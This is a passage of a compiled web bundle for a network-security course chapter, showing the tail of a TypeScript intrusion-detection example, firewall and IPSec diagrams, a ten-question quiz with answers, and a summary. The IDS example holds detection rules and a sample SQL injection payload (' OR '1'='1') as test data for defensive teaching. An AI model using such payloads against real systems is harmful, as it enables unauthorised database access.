timestamp: new Date(),\n              description: `SQL injection signature matched in payload from ${packet.sourceIp}: ${pattern}`,\n            };\n          }\n        }\n        break;\n      }\n    }\n\n    return null;\n  }\n}\n\n// Example usage\nconst rules: IDSRule[] = [\n  { id: 'R001', signature: 'SYN_FLOOD', severity: 'critical', action: 'block' },\n  { id: 'R002', signature: 'PORT_SCAN', severity: 'high', action: 'alert' },\n  { id: 'R003', signature: 'SQL_INJECTION', severity: 'critical', action: 'block' },\n];\n\nconst engine = new IDSEngine(rules);\n\nconst testPackets: Packet[] = [\n  // SYN flood simulation: 101 SYN packets from same source\n  ...Array.from({ length: 101 }, (_, i) => ({\n    sourceIp: '10.0.0.5',\n    destIp: '192.168.1.1',\n    sourcePort: 40000 + i,\n    destPort: 80,\n    protocol: 'TCP',\n    payload: '',\n    flags: ['SYN'],\n  })),\n  // SQL injection attempt\n  {\n    sourceIp: '10.0.0.99',\n    destIp: '192.168.1.10',\n    sourcePort: 54321,\n    destPort: 443,\n    protocol: 'TCP',\n    payload: \"SELECT * FROM users WHERE username = 'admin' OR '1'='1'\",\n    flags: ['PSH', 'ACK'],\n  },\n];\n\nconst alerts = engine.matchRules(testPackets);\nconsole.log(`Total alerts generated: ${alerts.length}`);\nalerts.forEach(a => console.log(`  [${a.severity}] ${a.description} → action: ${a.action}`));\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "mermaid-diagrams",
+      children: "Mermaid Diagrams"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "1-firewall-architecture--dmz-with-layered-defense",
+      children: "1. Firewall Architecture — DMZ with Layered Defense"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "The diagram below illustrates a typical enterprise firewall architecture with a perimeter firewall, DMZ segment, internal firewall, and management network. Traffic flows from the external internet through multiple inspection layers before reaching sensitive internal resources."
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-mermaid",
+        children: "flowchart TB\n    subgraph Internet[\"🌐 External Network (Internet)\"]\n        A1[Attacker]\n        A2[Legitimate User]\n    end\n\n    subgraph Perimeter[\"🛡️ Perimeter Security\"]\n        LB[Load Balancer]\n        WAF[WAF - Web Application Firewall]\n        NGFW[Next-Gen Firewall / IPS]\n        IDS[IDS/IPS Sensor]\n    end\n\n    subgraph DMZ[\"🏗️ DMZ - Demilitarized Zone\"]\n        WEB[Web Servers :80/:443]\n        EMAIL[Email Gateway :25/:587]\n        DNS[DNS Server :53]\n    end\n\n    subgraph Internal[\"🔒 Internal Network\"]\n        FW2[Internal Firewall / Zone Gateway]\n        DB[(Database Servers)]\n        APP[Application Servers]\n        DC[Domain Controller / LDAP]\n    end\n\n    subgraph Management[\"⚙️ Management & Monitoring\"]\n        SIEM[SIEM / Log Collector]\n        NAC[Network Access Control]\n        PATCH[Patch Management Server]\n    end\n\n    Internet --> LB\n    LB --> WAF\n    WAF --> NGFW\n    NGFW --> IDS\n    IDS --> DMZ\n    DMZ --> FW2\n    FW2 --> Internal\n    Internal -.->|Logs & Telemetry| SIEM\n    Management -.->|Policy Mgmt| NGFW\n    Management -.->|Policy Mgmt| FW2\n    NAC -.->|Endpoint Compliance| FW2\n\n    style Internet fill:#ffcccc\n    style Perimeter fill:#ffe0cc\n    style DMZ fill:#ccffcc\n    style Internal fill:#ccccff\n    style Management fill:#ffccff\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "2-vpn-tunnel-establishment--ipsec-ikev1-main-mode",
+      children: "2. VPN Tunnel Establishment — IPSec IKEv1 Main Mode"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "This sequence diagram details the two-phase IPSec tunnel establishment process. Phase 1 (Main Mode) sets up a secure ISAKMP control channel using Diffie-Hellman key exchange. Phase 2 (Quick Mode) negotiates the actual IPSec security associations for data protection."
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-mermaid",
+        children: "sequenceDiagram\n    participant Client as VPN Client\n    participant GW as VPN Gateway\n    participant SA as SA Manager\n\n    Note over Client,SA: IKE Phase 1 — Main Mode (ISAKMP SA)\n\n    Client->>GW: ① SA Proposal (Encryption, Hash, DH Group, Auth Method)\n    GW-->>Client: ② Selected Cipher Suite (accepted proposal)\n    Client->>GW: ③ DH Public Value (g^xa mod p)\n    GW-->>Client: ④ DH Public Value (g^xb mod p)\n    Note over Client,GW: Shared Key Material = g^(xa·xb) mod p\n\n    Client->>GW: ⑤ Encrypted ID + Nonce + Proof of Identity\n    GW-->>Client: ⑥ Encrypted ID + Nonce + Proof of Identity\n    Note over Client,GW: ✔ IKE Phase 1 Complete → ISAKMP SA (encrypted control channel)\n\n    Note over Client,SA: IKE Phase 2 — Quick Mode (IPSec SA)\n\n    Client->>GW: ⑦ IPSec Proposal + SPI + Traffic Selectors\n    GW-->>Client: ⑧ Accepted IPSec Proposal + Nonce + SPI\n    Client->>GW: ⑨ Confirm + Fresh Keying Material\n    Note over Client,GW: ✔ IPSec SA Established → Encrypted Data Tunnel\n\n    Note over Client,GW: 🔒 Secure Data Transfer via ESP in Tunnel Mode\n\n    Client->>GW: Encrypted Inner IP Packet (ESP Payload)\n    GW-->>Client: Encrypted Inner IP Packet (ESP Payload)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "chapter-quiz",
+      children: "Chapter Quiz"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Test your understanding of network security concepts covered in this chapter."
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "#"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Question"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "A"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "B"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "C"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "D"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Answer"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "1"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Which firewall type maintains a state table tracking TCP handshake states and only allows packets belonging to established connections?"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Packet filter firewall"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Stateful firewall"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Proxy firewall"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Web application firewall (WAF)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "B"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "2"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "What is the primary functional difference between an IDS and an IPS?"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "IDS is passive (monitors and alerts), IPS is inline (can actively block)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "IDS is faster than IPS"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "IPS only works at Layer 7"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "IDS requires signatures, IPS uses anomaly detection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "A"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "3"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "In a DMZ network architecture, publicly accessible servers should be placed:"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "On the internal trusted network behind a single firewall"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "In a separate network segment isolated between two firewalls"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "On the same broadcast domain as client workstations"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Directly on the internet with host-based firewalls only"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "B"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "4"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Which IDS detection method builds a statistical baseline of normal traffic and flags deviations?"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Signature-based detection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Anomaly-based detection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Stateful protocol analysis"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Heuristic analysis"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "B"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "5"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "In IPSec VPN, what is the purpose of IKE Phase 1?"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Establish the IPSec SA for encrypting user data"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Establish a secure ISAKMP control channel (authenticated DH key exchange)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Authenticate individual users via RADIUS"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Negotiate compression algorithms"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "B"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "6"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Which wireless security standard replaces WPA2's PSK with Simultaneous Authentication of Equals (SAE), providing forward secrecy?"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "WEP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "WPA2-TKIP"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "WPA3"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "802.11i"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "C"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "7"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "A SYN flood attack exploits which aspect of the TCP protocol?"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "The three-way handshake — the server allocates resources before the handshake completes"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Window size negotiation consuming excessive memory"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Sequence number randomization delays processing"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Congestion control algorithm retransmission timers"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "A"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "8"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Which attack involves an attacker sending forged ARP messages to associate their MAC address with a legitimate IP address?"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "DNS cache poisoning"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "ARP spoofing (ARP cache poisoning)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "DHCP starvation"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "MAC flooding (CAM table overflow)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "B"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "9"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Network segmentation using VLANs primarily provides:"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Encryption of inter-VLAN traffic"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Logical isolation of broadcast domains at Layer 2"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Automatic load balancing between subnets"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Transparent failover for critical network paths"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "B"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "10"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Which switch security feature validates ARP packets against a trusted DHCP binding database to prevent ARP spoofing?"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Port security with sticky MAC"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Dynamic ARP Inspection (DAI)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "VLAN trunking (802.1Q)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Spanning Tree Protocol (STP) BPDU Guard"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "B"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "practical-takeaways",
+      children: "Practical Takeaways"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Takeaway"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Application"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Layered Firewall Architecture"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Deploy stateful firewall at perimeter + NGFW for internal segmentation + WAF for web applications"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "IDS/IPS with Hybrid Detection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Use signature-based rules for known threats and anomaly-based detection for zero-day threats — Suricata for modern deployments"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "VPN for Secure Remote Access"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Use WireGuard for performance-critical tunnels, IPsec IKEv2 for enterprise site-to-site, OpenVPN for legacy compatibility"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Network Segmentation (VLANs + DMZ + Micro-segmentation)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Place public servers in DMZ, isolate IoT on separate VLANs, use Kubernetes Network Policies for micro-segmentation"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Protocol Security (DNSSEC, DHCP Snooping, BGP RPKI, SNMPv3)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Harden DNS with DNSSEC, enable DHCP snooping on switches, validate BGP routes with RPKI, use SNMPv3 with auth+privacy"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Wireless Security (WPA3-Enterprise + 802.1X)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Deploy WPA3 with SAE for home/SMB; use 802.1X/EAP-TLS with certificate authentication for enterprise"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Zero Trust Networking"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Implement identity-aware proxies, micro-segmentation, and continuous verification — remove implicit trust based on network location"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "summary",
+      children: "Summary"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Core Security Principles:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Defense in depth: no single control is sufficient"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Least privilege: only what is needed for function"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Default deny: block everything, allow explicitly"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Continuous verification: never trust, always verify"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Key Takeaways:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Firewalls provide the first line of defense; choose type based on deployment context"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "IDS/IPS detects known and unknown threats; signature + anomaly hybrid is most effective"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "VPNs encrypt traffic; WireGuard offers modern crypto and performance, IPsec offers enterprise features"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Segment networks to contain breaches → VLANs for basic isolation, micro-segmentation for zero trust"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Secure all protocols (DNS with DNSSEC, DHCP with snooping, BGP with RPKI, SNMPv3)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Wireless requires enterprise-grade authentication (802.1X/EAP-TLS + WPA3)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "DDoS mitigation requires layered approaches from rate limiting to cloud scrubbing"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Zero Trust is the architectural destination: identity-driven, micro-segmented, encrypted everywhere"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Remember:"
+      }), " Network security is not a product → it is a process of continuous monitoring, assessment, and improvement. The threats evolve daily; your defenses must evolve with them."]
+    })]
+  });
+}
+function MDXContent(props = {}) {
+  const {wrapper: MDXLayout} = {
+    ...(0,lib/* useMDXComponents */.R)(),
+    ...props.components
+  };
+  return MDXLayout ? (0,jsx_runtime.jsx)(MDXLayout, {
+    ...props,
+    children: (0,jsx_runtime.jsx)(_createMdxContent, {
+      ...props
+    })
+  }) : _createMdxContent(props);
+}
+
+
+
+/***/ },
+
+/***/ 28453
+(__unused_webpack___webpack_module__, __webpack_exports__, __webpack_require__) {
+
+/* harmony export */ __webpack_require__.d(__webpack_exports__, {
+/* harmony export */   R: () => (/* binding */ useMDXComponents),
+/* harmony export */   x: () => (/* binding */ MDXProvider)
+/* harmony export */ });
+/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(96540);
+/**
+ * @import {MDXComponents} from 'mdx/types.js'
+ * @import {Component, ReactElement, ReactNode} from 'react'
+ */
+
+/**
+ * @callback MergeComponents
+ *   Custom merge function.
+ * @param {Readonly<MDXComponents>} currentComponents
+ *   Current components from the context.
+ * @returns {MDXComponents}
+ *   Additional components.
+ *
+ * @typedef Props
+ *   Configuration for `MDXProvider`.
+ * @property {ReactNode | null | undefined} [children]
+ *   Children (optional).
+ * @property {Readonly<MDXComponents> | MergeComponents | null | undefined} [components]
+ *   Additional components to use or a function that creates them (optional).
+ * @property {boolean | null | undefined} [disableParentContext=false]
+ *   Turn off outer component context (default: `false`).
+ */
+
+
+
+/** @type {Readonly<MDXComponents>} */
+const emptyComponents = {}
+
+const MDXContext = react__WEBPACK_IMPORTED_MODULE_0__.createContext(emptyComponents)
+
+/**
+ * Get current components from the MDX Context.
+ *
+ * @param {Readonly<MDXComponents> | MergeComponents | null | undefined} [components]
+ *   Additional components to use or a function that creates them (optional).
+ * @returns {MDXComponents}
+ *   Current components.
+ */
+function useMDXComponents(components) {
+  const contextComponents = react__WEBPACK_IMPORTED_MODULE_0__.useContext(MDXContext)
+
+  // Memoize to avoid unnecessary top-level context changes
+  return react__WEBPACK_IMPORTED_MODULE_0__.useMemo(
+    function () {
+      // Custom merge via a function prop
+      if (typeof components === 'function') {
+        return components(contextComponents)
+      }
+
+      return {...contextComponents, ...components}
+    },
+    [contextComponents, components]
+  )
+}
+
+/**
+ * Provider for MDX context.
+ *
+ * @param {Readonly<Props>} properties
+ *   Properties.
+ * @returns {ReactElement}
+ *   Element.
+ * @satisfies {Component}
+ */
+function MDXProvider(properties) {
+  /** @type {Readonly<MDXComponents>} */
+  let allComponents
+
+  if (properties.disableParentContext) {
+    allComponents =
+      typeof properties.components === 'function'
+        ? properties.components(emptyComponents)
+        : properties.components || emptyComponents
+  } else {
+    allComponents = useMDXComponents(properties.components)
+  }
+
+  return react__WEBPACK_IMPORTED_MODULE_0__.createElement(
+    MDXContext.Provider,
+    {value: allComponents},
+    properties.children
+  )
+}
+
+
+/***/ }
+
+}]);
